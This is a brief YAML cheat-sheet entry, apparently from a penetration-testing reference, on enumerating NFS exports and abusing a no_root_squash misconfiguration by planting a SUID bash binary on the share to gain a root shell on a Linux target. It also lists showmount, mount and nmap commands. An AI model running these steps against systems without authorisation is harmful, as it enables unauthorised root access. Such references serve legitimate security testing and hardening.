---
description: |
  Enumerate and mount NFS shares to access remote files.

  Reference values:
    Target IP: 10.10.10.1
command: |
  # Show NFS exports
  showmount -e 10.10.10.1

  # Mount NFS share
  sudo mount -t nfs 10.10.10.1:/share /mnt/nfs

  # Mount with no_root_squash exploit
  sudo mount -t nfs 10.10.10.1:/share /mnt/nfs
  # Copy bash, set SUID
  cp /bin/bash /mnt/nfs/bash
  chmod +s /mnt/nfs/bash
  # On target: /share/bash -p

  # Nmap scripts
  nmap -p 111,2049 --script nfs-ls,nfs-statfs,nfs-showmount 10.10.10.1
phase:
  - Enumeration
  - Exploitation
target_os:
  - Linux
services:
  - NFS
items:
  - No_Creds
techniques:
  - Linux_Misconfig
network_position:
  - Internal
references:
  - https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html
---
